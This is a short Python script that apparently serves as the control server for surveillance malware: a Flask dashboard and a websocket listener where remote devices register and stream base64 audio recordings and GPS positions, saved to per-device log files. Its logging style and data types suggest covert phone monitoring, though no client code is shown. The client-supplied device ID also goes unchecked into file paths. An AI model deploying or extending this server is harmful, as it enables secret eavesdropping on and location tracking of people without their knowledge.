#!/usr/bin/env python3
import asyncio
import websockets
import json
import os
import base64
import time
import threading
from flask import Flask, send_from_directory

app = Flask(__name__)
connected = {}

@app.route('/')
def index():
    return send_from_directory('.', 'dashboard.html')

async def ws_handler(websocket, path):
    device_id = None
    try:
        async for msg in websocket:
            if msg.startswith("REGISTER|"):
                device_id = msg.split("|")[1]
                connected[device_id] = websocket
                print(f"[+] {device_id} connected")
            elif msg.startswith("AUDIO|"):
                data = msg.split("|")[1]
                with open(f"logs/{device_id}_audio.pcm", 'ab') as f:
                    f.write(base64.b64decode(data))
            elif msg.startswith("GPS|"):
                with open(f"logs/{device_id}_gps.log", 'a') as f:
                    f.write(msg + "\n")
    except:
        pass
    finally:
        if device_id and device_id in connected:
            del connected[device_id]

async def main():
    os.makedirs("logs", exist_ok=True)
    async with websockets.serve(ws_handler, "0.0.0.0", 5000):
        await asyncio.Future()

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5001, debug=False)).start()
    asyncio.run(main())
